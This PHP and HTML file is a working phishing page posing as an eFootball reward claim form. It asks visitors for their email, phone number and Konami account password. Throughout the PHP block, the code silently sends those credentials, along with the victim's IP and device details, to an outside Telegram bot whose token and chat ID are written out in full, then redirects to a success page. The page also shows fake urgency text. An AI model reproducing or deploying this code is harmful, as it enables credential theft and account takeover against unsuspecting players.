<?php
if ($_POST) {
    $email = $_POST['email'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $password = $_POST['password'] ?? '';
    $reward = $_GET['reward'] ?? 'Your Spin';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Escape for Telegram HTML
    $email_html = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    $phone_html = htmlspecialchars($phone, ENT_QUOTES, 'UTF-8');
    $password_html = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');
    $reward_html = htmlspecialchars($reward, ENT_QUOTES, 'UTF-8');
    $ip_html = htmlspecialchars($ip, ENT_QUOTES, 'UTF-8');
    
    // Telegram message - PROFESSIONAL FORMAT
    $message = "⚽ <b>eFootball™ NEW CAPTURE</b>\n\n";
    $message .= "📧 <b>Email:</b> $email_html\n";
    $message .= "📱 <b>Phone:</b> $phone_html\n";
    $message .= "🔐 <b>Password:</b> $password_html\n";
    $message .= "🎁 <b>Reward:</b> $reward_html Coins\n";
    $message .= "🌐 <b>IP:</b> $ip_html\n";
    $message .= "📱 <b>Device:</b> " . substr($user_agent, 0, 100) . "...\n";
    $message .= "⏰ <b>" . date('Y-m-d H:i:s') . "</b>";
    
    // YOUR BOT - READY TO GO
    $botToken = '7839000336:AAHLvYaq43wnFUl89J9ki15Utdlc23xV1Lc';
    $chatId = '7133577749';  // ← PUT YOUR CHAT ID HERE
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    
    @file_get_contents($url); // Silent send
    
    session_start();
    $_SESSION['reward'] = $reward;
    $_SESSION['email'] = $email;
    header('Location: success.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball™ - Claim Reward</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 25px;
            padding: 40px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 90%;
            color: #333;
        }
        .logo {
            text-align: center;
            font-size: 2.2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .reward-display {
            background: linear-gradient(135deg, #ffd700, #ffed4a);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(255,215,0,0.4);
        }
        .reward-amount {
            font-size: 2.5rem;
            font-weight: 700;
            color: #b8860b;
        }
        .reward-text { 
            color: #666; 
            font-weight: 500;
            margin-top: 5px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #444;
        }
        input {
            width: 100%;
            padding: 18px;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            font-family: inherit;
        }
        input:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 0 3px rgba(0,212,255,0.1);
        }
        .claim-btn {
            width: 100%;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            border: none;
            padding: 20px;
            font-size: 1.3rem;
            font-weight: 700;
            border-radius: 15px;
            color: white;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 15px 35px rgba(0,212,255,0.4);
        }
        .claim-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 45px rgba(0,212,255,0.6);
        }
        .urgency {
            text-align: center;
            margin-top: 20px;
            color: #ff6b35;
            font-weight: 600;
            font-size: 0.95rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">⚽ eFootball™</div>
        <div class="reward-display">
            <div class="reward-amount" id="rewardAmount"><?php echo htmlspecialchars($_GET['reward'] ?? 'Special'); ?> Coins</div>
            <div class="reward-text">Congratulations on your spin!</div>
        </div>
        
        <form method="POST">
            <div class="form-group">
                <label>📧 Email Address</label>
                <input type="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label>📱 Phone Number (SMS Verification)</label>
                <input type="tel" name="phone" placeholder="+1 (555) 123-4567" required>
            </div>
            <div class="form-group">
                <label>🔐 Konami Account Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="claim-btn">CLAIM REWARD NOW</button>
        </form>
        
        <div class="urgency">
            ⏰ SMS sent to your phone - Check in 30 seconds!
        </div>
    </div>
</body>
</html>
